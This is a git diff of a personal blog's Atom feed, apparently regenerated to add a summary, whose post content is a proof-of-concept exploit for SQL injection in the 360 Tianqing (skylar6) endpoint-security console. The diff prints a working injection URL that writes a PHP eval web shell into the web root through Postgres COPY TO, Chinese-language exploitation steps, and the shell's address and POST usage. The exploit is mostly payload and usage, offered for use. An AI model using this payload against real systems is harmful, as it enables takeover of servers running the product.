@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://p1and.github.io</id>
     <title>P1and</title>
-    <updated>2021-06-16T10:31:13.654Z</updated>
+    <updated>2021-06-16T10:33:47.873Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://p1and.github.io"/>
     <link rel="self" href="https://p1and.github.io/atom.xml"/>
@@ -16,9 +16,14 @@
         <link href="https://p1and.github.io/post/360-tian-qing-qian-tai-sql-zhu-ru/">
         </link>
         <updated>2021-06-16T10:28:09.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="poc">poc</h2>
+<pre><code>注入写shell:</code></pre>
+]]></summary>
         <content type="html"><![CDATA[<h2 id="poc">poc</h2>
 <pre><code>注入写shell:
-https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('&lt;?php @eval($_POST[1]);?&gt;');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- 
+</code></pre>
+<!-- more -->
+<pre><code>https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('&lt;?php @eval($_POST[1]);?&gt;');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- 
 </code></pre>
 <p>利用过程:<br>
 1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell<br>
@@ -27,7 +32,9 @@ https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT
 4. Postgres数据库 使用COPY TO把一个表的所有内容都拷贝到一个文件(完成写shell)<br>
 5. 删除 表O</p>
 <pre><code>shell地址:
-    https://192.168.24.196:8443/1.php
+</code></pre>
+<!-- more -->
+<pre><code>    https://192.168.24.196:8443/1.php
     POST
         1=phpinfo();
 </code></pre>
